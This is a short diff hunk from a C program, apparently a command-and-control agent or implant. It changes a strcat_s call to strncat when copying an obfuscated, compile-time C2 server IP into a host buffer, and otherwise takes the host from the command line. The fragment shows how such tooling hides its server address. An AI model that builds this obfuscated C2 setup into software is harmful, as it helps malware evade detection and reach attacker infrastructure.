@@ -169,7 +169,7 @@ int main(int argc, char** argv){
     
     
 #ifdef C2_IP // set static IP
-    strcat_s(C2_host, sizeof(C2_host), OBFUSCATED(C2_IP));
+    strncat(C2_host, OBFUSCATED(C2_IP), sizeof(C2_host) - 1);
 #else
     parse_args(argc, argv, C2_host, username);
 #endif // C2_IP
